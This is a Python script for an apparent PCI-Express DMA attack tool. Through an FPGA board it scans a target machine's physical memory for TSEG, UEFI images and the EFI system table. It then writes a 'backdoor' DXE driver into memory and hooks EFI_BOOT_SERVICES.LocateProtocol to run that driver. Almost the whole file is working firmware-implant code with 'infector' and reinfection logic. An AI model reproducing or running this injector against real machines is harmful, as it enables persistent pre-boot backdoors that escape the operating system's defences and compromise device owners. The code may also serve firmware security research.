#!/usr/bin/env python

import sys, os, time
from struct import pack, unpack

from pcie_lib import *


# physical address where DXE driver will be loaded
BACKDOOR_ADDR = 0x10000

# physical address where exploitation status info will be stored
STATUS_ADDR = 0x1000 - (8 * 2)

MAX_PE_HEADER_SIZE = 0x400
MAX_TSEG_SIZE = 0x800000

ALLOW_REINFECT = True

DOS_HEADER_MAGIC = 'MZ'

# See struct _INFECTOR_CONFIG in PeiBackdoor.h
INFECTOR_CONFIG_SECTION = '.conf'
INFECTOR_CONFIG_FMT = 'QQQ'
INFECTOR_CONFIG_LEN = 8 + 8 + 8


def _infector_config_offset(pe):
        
    for section in pe.sections:

        # find .conf section of payload image
        if section.Name[: len(INFECTOR_CONFIG_SECTION)] == INFECTOR_CONFIG_SECTION:

            return section.PointerToRawData

    raise(Exception('Unable to find %s section' % INFECTOR_CONFIG_SECTION))

def _infector_config_get(pe, data):

    offs = _infector_config_offset(pe)
    
    return unpack(INFECTOR_CONFIG_FMT, data[offs : offs + INFECTOR_CONFIG_LEN])        


def _infector_config_set(pe, data, *args):

    offs = _infector_config_offset(pe)

    return data[: offs] + \
           pack(INFECTOR_CONFIG_FMT, *args) + \
           data[offs + INFECTOR_CONFIG_LEN :]

def infector_get_image(payload, locate_protocol, system_table):

    import pefile

    # load payload image
    pe_payload = pefile.PE(payload)

    if pe_payload.OPTIONAL_HEADER.FileAlignment != \
       pe_payload.OPTIONAL_HEADER.SectionAlignment:

        raise(Exception('Bad payload image'))

    # read payload image data into the string
    data = open(payload, 'rb').read()

    # read _INFECTOR_CONFIG, this structure is located at .conf section of payload image
    entry_rva, _, _ = _infector_config_get(pe_payload, data)
    config_rva = _infector_config_offset(pe_payload)
    
    # write updated _INFECTOR_CONFIG back to the payload image
    data = _infector_config_set(pe_payload, data, entry_rva, locate_protocol, system_table)

    return data, entry_rva, config_rva

def find_tseg(dev):

    addr = 0xf0000000

    while addr > 0:

        try:

            ptr = 0

            # do memory read attempt
            dev.mem_read_4(addr)            

            while ptr < 0x10000000:

                try:

                    # do memory read attempt
                    dev.mem_read_4(addr + ptr)            

                except dev.ErrorBadCompletion:

                    return addr + ptr

                ptr += MAX_TSEG_SIZE

        except dev.ErrorBadCompletion:

            pass

        addr -= 0x10000000

    return None

def find_pe(dev, addr, size = 0x10000000, step = 1):

    ptr = 0

    while ptr < size:

        # check for DOS header
        if dev.mem_read(addr + ptr, 2) == DOS_HEADER_MAGIC:

            return addr + ptr
        
        ptr -= step * PAGE_SIZE

    return None

def find_sys_table(dev, addr):

    import pefile

    def _find(data):

        for ptr in range(0, PAGE_SIZE / 8):
            
            # get single pointer from data section
            val = unpack('Q', data[ptr * 8 : ptr * 8 + 8])[0]
            
            # check for valid physical address
            if val > 0x10000000 and val < 0xf0000000:

                # check EFI_SYSTEM_TABLE signature
                if dev.mem_read(val, 8) == 'IBI SYST':

                    return val

        return None

    # read PE image header
    pe = pefile.PE(data = dev.mem_read(addr, MAX_PE_HEADER_SIZE))

    # check for EFI_SYSTEM_TABLE at the beginning of the .data section
    for section in pe.sections:

        if section.Name.find('.data') == 0:

            val = _find(dev.mem_read(addr + section.VirtualAddress, PAGE_SIZE))

            if val is not None: return val
            

    # check for EFI_SYSTEM_TABLE at the end of the .text section
    for section in pe.sections:

        if section.Name.find('.text') == 0:

            val = _find(dev.mem_read(addr + section.VirtualAddress + \
                                            section.SizeOfRawData - PAGE_SIZE, PAGE_SIZE))
        
            if val is not None: return val

    return None

EFI_SYSTEM_TABLE_BootServices = 0x60
EFI_BOOT_SERVICES_LocateProtocol = 0x140

valid_dxe_addr = lambda addr: addr > 0x1000 and addr < 0x100000000

def dxe_inject(payload = None, system_table = None, status_addr = STATUS_ADDR):

    dev = None    

    while True:

        try:

            # open FPGA board
            dev = TransactionLayer() if dev is None else dev

            # try to read some memory 
            if dev.mem_read(BACKDOOR_ADDR, 2) == DOS_HEADER_MAGIC:

                if not ALLOW_REINFECT:

                    print('ERROR: Already infected')
                    return -1

            break

        except LinkLayer.ErrorNotReady as e: 

            print('[!] ' + str(e))

        except LinkLayer.ErrorTimeout as e:

            print('[!] ' + str(e))

        except TransactionLayer.ErrorBadCompletion as e: 

            print('[!] ' + str(e))        

        # system is not ready yet
        time.sleep(0.1)
    
    print('[+] PCI-E link with target is up')

    t = time.time()

    if system_table is None:

        tseg, g_st = find_tseg(dev), None

        if tseg is None:

            print('[!] Unable to locate TSEG, trying to find PE image...')

            base, ptr = 0x80000000, 0

            # try to find usable UEFI image at the middle of the first 4GB
            while ptr < base:

                image = base - ptr
                
                # check for DOS header
                if dev.mem_read(image, 2) == DOS_HEADER_MAGIC:

                    print('[+] PE image is at 0x%x' % image)

                    g_st = find_sys_table(dev, image)
                    if g_st is not None:

                        print('[+] EFI_SYSTEM_TABLE is at 0x%x' % g_st)

                    break

                ptr += 0x20 * PAGE_SIZE

        else:

            print('[+] TSEG is somewhere around 0x%x' % tseg)

            pe_addr = tseg - MAX_TSEG_SIZE
            
            while True:

                image = find_pe(dev, pe_addr, step = 0x10)
                assert image is not None
                
                print('[+] PE image is at 0x%x' % image)
                
                g_st = find_sys_table(dev, image)
                if g_st is not None:

                    print('[+] EFI_SYSTEM_TABLE is at 0x%x' % g_st)
                    break

                # try next PE image
                pe_addr = image - PAGE_SIZE

    else:

        g_st = system_table

    assert g_st is not None
    assert valid_dxe_addr(g_st)

    g_bs = dev.mem_read_8(g_st + EFI_SYSTEM_TABLE_BootServices)    

    print('[+] EFI_BOOT_SERVICES is at 0x%x' % g_bs)

    assert valid_dxe_addr(g_bs)

    locate_protocol = dev.mem_read_8(g_bs + EFI_BOOT_SERVICES_LocateProtocol)    

    print('[+] EFI_BOOT_SERVICES.LocateProtocol() address is 0x%x' % locate_protocol)    

    assert valid_dxe_addr(locate_protocol)

    if payload is not None:

        data, entry_rva, _ = infector_get_image(payload, locate_protocol, g_st)
        new_locate_protocol = BACKDOOR_ADDR + entry_rva

        print('Backdoor image size is 0x%x' % len(data))
        print('Backdoor entry RVA is 0x%x' % entry_rva)
        print('Planting DXE stage driver at 0x%x...' % BACKDOOR_ADDR)        

        dev.mem_write(BACKDOOR_ADDR, data)

        dev.mem_write_8(status_addr + 0, 0)
        dev.mem_write_8(status_addr + 8, 0)

        print('Hooking LocateProtocol(): 0x%.8x -> 0x%.8x' % \
              (locate_protocol, new_locate_protocol))

        dev.mem_write_8(g_bs + EFI_BOOT_SERVICES_LocateProtocol, new_locate_protocol)        

        print('%f sec.' % (time.time() - t))

    return dev

def main():

    dev = dxe_inject(payload = None)
    dev.close()

    return 0

if __name__ == '__main__':

    exit(main())

#
# EoF
#
